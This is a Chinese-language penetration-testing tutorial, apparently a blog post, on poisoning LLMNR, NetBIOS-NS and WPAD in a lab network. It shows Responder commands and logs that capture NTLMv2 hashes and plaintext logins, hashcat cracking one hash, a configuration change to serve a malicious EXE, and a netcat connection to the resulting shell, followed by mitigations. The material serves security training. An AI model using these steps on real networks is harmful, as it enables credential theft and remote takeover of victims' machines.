---
layout: post
title: 在渗透测试中使用LLMNR和WPAD
description: "LLMNR and WPAD abuse"
category: pentest
tags: [pentest]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---

# 在渗透测试中使用LLMNR和WPAD

在内部渗透测试中，我们模拟对配置不当的网络层协议及服务展开攻击。这些攻击产生的主要原因是ARP、DHCP等协议的机制特性或者不当的DNS配置。其中危害最为严重的攻击类型无疑是中间人攻击。它可以实现通过监听网络流量来获取敏感信息，或者操纵篡改响应数据。针对这类攻击的防御措施可以在路由器和交换机上来实施。然而，由于一些协议的固有缺陷，我们可以通过其他不同方式完成相同的攻击效果。因此，本文将集中讲述LLMNR、NetBIOS、WPAD机制下的中间人攻击。开始之前，我想首先解释一下windows操作系统的主机是如何在同一个网络中进行命名解析和相互通信交互的。

1、检查文件系统中的host文件
> 在配置文件中查询是否存在需要访问的系统信息。同时，也会检查需要访问的设备是不是自身
> 这个配置文件的路径是C:\Windows\System32\drivers\etc

2、检查本地DNS缓存

> 如果缓存中存在需要访问的设备信息，这些信息将会被使用
> 本地DNS缓存可以通过命令 ipconfig /displaydns来查询

3、向DNS服务器发送查询请求

> 如果没有在本地发现任何与需要访问的设备相关的信息，会向本地网络中的DNS服务器发送DNS查询请求

4、发送LLMNR查询请求

> LLMNR是一种在DNS解析失败后进行名称解析的协议

5、发送NetBIOS-NS查询请求

> NetBIOS工作在OSI模型中的会话层，它是一个API，并不是一种协议，用来在windows系统之间通信
> 计算机的NetBIOS名称与机器名相同


### 什么是LLMNR和NetBIOS-N
LLMNR（链路本地多播名称解析）和NetBIOS-NS （命名服务）是windows操作系统的两个用来进行命名解析和通信的模块。LLMNR协议首次出现在windows vista操作系统中，并被看作是NetBIOS-NS 服务的替代者。

在DNS解析失败的情况下，这两个服务将继续进行命名解析。LLMNR和NetBIOS-NS服务尝试处理DNS解析无法处理的查询请求。实际上，这是windows操作系统设备之间的协作模式。

LLMNR协议通过链路域多播IP地址224.0.0.252（IPv4情况下）或FF02:0:0:0:0:0:1:3 （IPv6情况下）提供服务。它通过TCP和UDP端口5355来执行操作。

例如，当尝试向网络中不存在的地址test.local进行ping操作时，首先进行DNS解析。当DNS服务器不能解析这个域名时，会继续通过LLMNR协议发送请求。LLMNR并不是DNS协议的升级；它只是DNS解析失败后的改进措施。它被windos vista之后的所有操作系统版本所支持。

![wireshark-llmnr](http://7xwdx7.com1.z0.glb.clouddn.com/llmnr_wireshark.png)

NetBIOS是一个本地网络中系统用来进行相互通信的API。NetBIOS服务有三种不同形式
命名服务，它使用UDP 137端口进行命名注册和命名解析
数据包分发服务，它使用UDP138端口进行无连接通信
会话服务，它使用TCP 139端口进行基于连接的通信

正如文章开头提到的，在DNS解析失败后LLMNR协议将会被使用，随后一个NetBIOS-NS 的广播查询会在流量中出现。

![wireshark-netbios](http://7xwdx7.com1.z0.glb.clouddn.com/netbios_wireshark.png)

理论上来说，这被认为是无害的并且本地网络中的功能系统并没有针对中间人攻击的保护。攻击者能够通过成功的攻击获取诸如用户名、密码散列之类的敏感信息。

通过操纵流量获取NTLMv2散列
相关主要过程如下图所示

![llmnr](http://7xwdx7.com1.z0.glb.clouddn.com/llmnr.png)

1、受害者想要连接一个叫做“filesrvr”的文件共享系统，并且出现了输入错误
2、正如上文所述，受害者使用的计算机首先会进行命名解析操作
3、在第二步中，由于DNS解析失败，会开始通过LLMNR、NetBIOS-NS 进行查询
4、攻击者监听网络流量获取了命名解析请求。一台名为“ze”的设备告诉受害者它就是受害者所查询的“filsrvr”设备。

攻击者会监听广播并且响应所有的LLMNR和NetBIOS-NS查询。通过这个方式，就能够操纵一个伪造的会话并获取用户名和密码散列。

可以使用不同的工具完成攻击
Responder是由“SpiderLabs”开发的（我们将会使用这个工具）
Metaploit框架中的“llmnr_response”模块
MiTMf框架

我们告诉Responder需要监听哪一块网卡的流量并开始减退

{% highlight javascript %}

root@kali:~# responder -i 10.7.7.31
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS, LLMNR & MDNS responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface: ALL
Challenge set: 1122334455667788
WPAD Proxy Server: False
WPAD script loaded: function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server: ON
HTTPS Server: ON
SMB Server: ON
SMB LM support: False
Kerberos Server: ON
SQL Server: ON
FTP Server: ON
IMAP Server: ON
POP3 Server: ON
SMTP Server: ON
DNS Server: ON
LDAP Server: ON
FingerPrint hosts: False
Serving Executable via HTTP&WPAD: OFF
Always Serving a Specific File via HTTP&WPAD: OFF

{% endhighlight %}

受害者尝试连接名为“filesrvr”的文件共享服务

![filwsrvr](http://7xwdx7.com1.z0.glb.clouddn.com/flsrvr.png)

然后我们获取了SMB-NTLMv2散列

{% highlight javascript %}

LLMNR poisoned answer sent to this IP: 10.7.7.30. The requested name was : filesrvr.
[+]SMB-NTLMv2 hash captured from : 10.7.7.30
[+]SMB complete hash is : Administrator::PENTESTLAB:1122334455667788:E360938548A17BF8E36239E2A3CC8FFC:0101000000000000EE36B4EE7358D201E09A8038DE69150F0000000002000A0073006D006200310032000100140053004500520056004500520032003000300038000400160073006D006200310032002E006C006F00630061006C0003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C00080030003000000000000000000000000030000056A8A45AB1D3338B0049B358B877AEEEE1AA43715BA0639FB20A86281C8FE2B40A0010000000000000000000000000000000000009001A0063006900660073002F00660069006C00650073007200760072000000000000000000
NBT-NS Answer sent to: 10.7.7.30. The requested name was : TOWER

{% endhighlight %}

我们知道NTLMv2散列不能被用来直接进行hash传递攻击。因此我们需要通过密码破解从散列中获取密码明文。有好多工具可以做破解，John the Ripper, Hashcat, Cain&Abel, Hydra 等等。我们将会使用hashcat来破解之前获取的NTLMv2散列。

Responder工具会把获取的数据保存在/usr/share/responder 目录

{% highlight javascript %}

root@kali:/usr/share/responder# ls *30*
SMB-NTLMv2-Client-10.7.7.30.txt

{% endhighlight %}

获取的NTLMv2散列如下：

{% highlight javascript %}

root@kali:/usr/share/responder# cat SMB-NTLMv2-Client-10.7.7.30.txt
Administrator::PENTESTLAB:1122334455667788:E360938548A17BF8E36239E2A3CC8FFC:0101000000000000EE36B4EE7358D201E09A8038DE69150F0000000002000A0073006D006200310032000100140053004500520056004500520032003000300038000400160073006D006200310032002E006C006F00630061006C0003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C00080030003000000000000000000000000030000056A8A45AB1D3338B0049B358B877AEEEE1AA43715BA0639FB20A86281C8FE2B40A0010000000000000000000000000000000000009001A0063006900660073002F00660069006C00650073007200760072000000000000000000

{% endhighlight %}

Hashcat是一个开源的密码破解工具。同时，还能支持GPU破解。通过设置-m参数它可以识别散列模式。在命令的最后，它开始使用字典进行爆破。

{% highlight javascript %}

root@kali:/usr/share/responder# hashcat -m 5600 SMB-NTLMv2-Client-10.7.7.30.txt ~/dic.txt
Initializing hashcat v2.00 with 4 threads and 32mb segment-size...

Added hashes from file SMB-NTLMv2-Client-10.7.7.30.txt: 1 (1 salts)
Activating quick-digest mode for single-hash with salt

[s]tatus [p]ause [r]esume [b]ypass [q]uit =>

Input.Mode: Dict (/root/dic.txt)
Index.....: 1/5 (segment), 3625424 (words), 33550339 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: 6.46M plains, 6.46M words
Progress..: 3625424/3625424 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


--- snippet ---


ADMINISTRATOR::PENTESTLAB:1122334455667788:e360938548a17bf8e36239e2a3cc8ffc:0101000000000000ee36b4ee7358d201e09a8038de69150f0000000002000a0073006d006200310032000100140053004500520056004500520032003000300038000400160073006d006200310032002e006c006f00630061006c0003002c0053004500520056004500520032003000300038002e0073006d006200310032002e006c006f00630061006c000500160073006d006200310032002e006c006f00630061006c00080030003000000000000000000000000030000056a8a45ab1d3338b0049b358b877aeeee1aa43715ba0639fb20a86281c8fe2b40a0010000000000000000000000000000000000009001a0063006900660073002f00660069006c00650073007200760072000000000000000000:Abcde12345.

All hashes have been recovered

Input.Mode: Dict (/root/dic.txt)
Index.....: 5/5 (segment), 552915 (words), 5720161 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 1.60M words
Progress..: 552916/552915 (100.00%)
Running...: 00:00:00:01
Estimated.: > 10 Years


Started: Sat Dec 17 23:59:22 2016
Stopped: Sat Dec 17 23:59:25 2016
root@kali:/usr/share/responder#

{% endhighlight %}


然后，我们获取了密码“Abcde12345“。


### 什么是WPAD

企业要求员工通过代理服务器访问公网来提升效率、确保安全并审计流量。企业内网中的用户应当无需配置就能获取访问特定URL的代理服务器配置信息。WPAD（网络代理自发现协议）就是一种客户端借助DHCP或者DNS服务定位配置文件URL的方法。一旦发现并下载配置文件，客户端就能决定特定URL的代理服务器配置信息。

### WPAD如何工作

客户端需要获取包含有代理配置信息的wpad.dat文件。它在本地网络中查询名为“wpad”的计算机设备。然后以下步骤将会被执行：
1、如果DHCP服务被配置了，客户端将会从DHCP服务器获取wpad.dat文件（如果成功，跳到第四步）
2、向DNS服务器发起一个“wpad.corpdomain.com”的解析请求来获取wpad配置文件分发设备的地址（如果成功，跳到第四步）
3、发起对WPAD的LLMNR查询（如果成功跳到第四步，如果失败则不能正常使用代理）
4、下载wpad.dat文件并使用

根据上述顺序，针对第一步可以进行DHCP污染攻击。自然地针对第二步可以进行DNS污染攻击。但是，我在文章开头指出，网络设备可以被配置来防御这些攻击。当一个请求通过LLMNR协议被发起时，请求会被广播到网络中的每一个客户端。此时，攻击者可以伪装成wpad服务器向受害者发送wpad.dat文件。

![wpad](http://7xwdx7.com1.z0.glb.clouddn.com/wpad-300x265.png)

需要强调的是WPAD协议是内置在windows操作系统中的。这个配置可以在IE浏览器的局域网设置中看到。

当开启配置时，IE会在整个网络中发起WPAD命名解析。

### 利用WPAD

Responder是一个中间人攻击的强大工具。Responder搭建了一个伪造的wpad服务并且响应所有客户端的wpad命名解析。客户端会从伪造的wpad服务器上下载wpad.dat文件。Responder创建了一个认证界面并要求客户端输入域账户及密码。企业员工会很自然的输入域账户和密码。最终，我们获取了这些域账户和密码。

使用responder工具是十分简单的

{% highlight javascript %}

root@kali:~# git clone https://github.com/SpiderLabs/Responder.git
Cloning into 'Responder'...
remote: Counting objects: 886, done.
remote: Total 886 (delta 0), reused 0 (delta 0), pack-reused 886
Receiving objects: 100% (886/886), 543.75 KiB | 255.00 KiB/s, done.
Resolving deltas: 100% (577/577), done.
Checking connectivity... done.

{% endhighlight %}

我搭建了如下系统来模拟攻击

![wpadtopo](http://7xwdx7.com1.z0.glb.clouddn.com/wpad_topo-1.png)

现在，我们搭建一个伪造的HTTP服务器并等待明文密码。

{% highlight javascript %}

root@kali:~/Responder# python Responder.py -I eth0 -wFb

---
snippet
---
[+] Poisoning Options:
 Analyze Mode [OFF]
 Force WPAD auth [ON]
 Force Basic Auth [ON]
 Force LM downgrade [OFF]
 Fingerprint hosts [OFF]

[+] Generic Options:
 Responder NIC [eth0]
 Responder IP [10.7.7.31]
 Challenge set [1122334455667788]



[+] Listening for events...

{% endhighlight %}

受害者会看到如下对话框并自然地输入用户名密码

![wpadattack](http://7xwdx7.com1.z0.glb.clouddn.com/wpad_attack.png)

然后明文密码如下：

{% highlight javascript %}

root@kali:~/Responder# python Responder.py -I eth0 -wFb

---
snippet
---
[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 10.7.7.30 for name GOOGLE.COM (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 10.7.7.30 for name WWW.GOOGLE.COM (service: Workstation/Redirector)
[HTTP] Basic Client : 10.7.7.30
[HTTP] Basic Username : PENTESTLAB\roland
[HTTP] Basic Password : secr3tPassw0rd123!
[*] [LLMNR] Poisoned answer sent to 10.7.7.30 for name respproxysrv
[SMB] NTLMv2-SSP Client : 10.7.7.30
[SMB] NTLMv2-SSP Username : PENTESTLAB\Administrator
[SMB] NTLMv2-SSP Hash : Administrator::PENTESTLAB:1122334455667788:8EBDB974DF3D5F4FB0CA15F1C5068856:01010000000000007894C6BE2C54D201FCEDFDB71BB6F1F20000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000B39077D5C9B729062C03BB45B88B0D9EC2672C57115A1FE3E06F77BD79551D8F0A001000000000000000000000000000000000000900220063006900660073002F007200650073007000700072006F00780079007300720076000000000000000000
[SMB] Requested Share : \\RESPPROXYSRV\IPC$
[*] [LLMNR] Poisoned answer sent to 10.7.7.30 for name respproxysrv
[*] Skipping previously captured hash for PENTESTLAB\Administrator
[SMB] Requested Share : \\RESPPROXYSRV\PICTURES
[*] [LLMNR] Poisoned answer sent to 10.7.7.30 for name respproxysrv
[*] Skipping previously captured hash for PENTESTLAB\Administrator
[SMB] Requested Share : \\RESPPROXYSRV\PICTURES
[*] [LLMNR] Poisoned answer sent to 10.7.7.30 for name respproxysrv
[*] Skipping previously captured hash for PENTESTLAB\Administrator
[SMB] Requested Share : \\RESPPROXYSRV\PICTURES
[*] Skipping previously captured hash for PENTESTLAB\roland

{% endhighlight %}

### 利用Responder创建后门

responder不仅仅可以用来进行WPAD服务的中间人攻击。它还能够通过将受害者重定向到一个伪造web页面的方式诱骗其下载恶意文件。可以使用社会工程学的方式使得伪造页面更为逼真。当然，responder自身也带有默认的重定向页面。我们需要做的只是对responder.conf配置文件做少许修改。我们将“Serve-HTML”和“Serve-EXE”参数设为“On”。

{% highlight javascript %}

[HTTP Server]

; Set to On to always serve the custom EXE
Serve-Always = On

; Set to On to replace any requested .exe with the custom EXE
Serve-Exe = On

; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = On

{% endhighlight %}

然后我们再次启动responder：

{% highlight javascript %}

root@kali:~/Responder# python Responder.py -I eth0 -i 10.7.7.31 -r On -w On

{% endhighlight %}

现在，当受害者尝试访问公网时，将会看到如下页面。这样，受害者有一定概率会点击“Proxy Client”超链接下载并绑定一个CMD shell。然后，我们可以通过nc连接受害者的140端口获取shell。

![wpadhtml](http://7xwdx7.com1.z0.glb.clouddn.com/wpad-fake-page.jpeg)

{% highlight javascript %}

root@kali:~/Responder# nc 10.7.7.30 140 -vv
10.7.7.30: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [10.7.7.30] 140 (?) open
        |
        |
        |
    /\  |  /\  
    //\. .//\
    //\ . //\
    /  ( )/  \

Welcome To Spider Shell!
ipconfig
Microsoft Windows [Version 6.1.7601]
(c) 2009 Microsoft Corporation. All Rights reserved.

C:\Users\Roland\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-spesific DNS Suffix   . : PENTESTLAB.local
   IPv4 Address . . . . . . . . . . . : 10.7.7.30
   Subnet Mask . . . . . . . . . . .  : 255.255.255.0
   Default Gateway . . . . . . . . .  : 10.7.7.1

{% endhighlight %}

### 针对WPAD的缓解措施

1、针对这种攻击的第一解决方案是，创建一个“WPAD”DNS解析记录并指向代理服务器。这样攻击者就没有机会操纵流量。
2、第二解决方案是在组策略中禁用IE的代理自动发现设置。
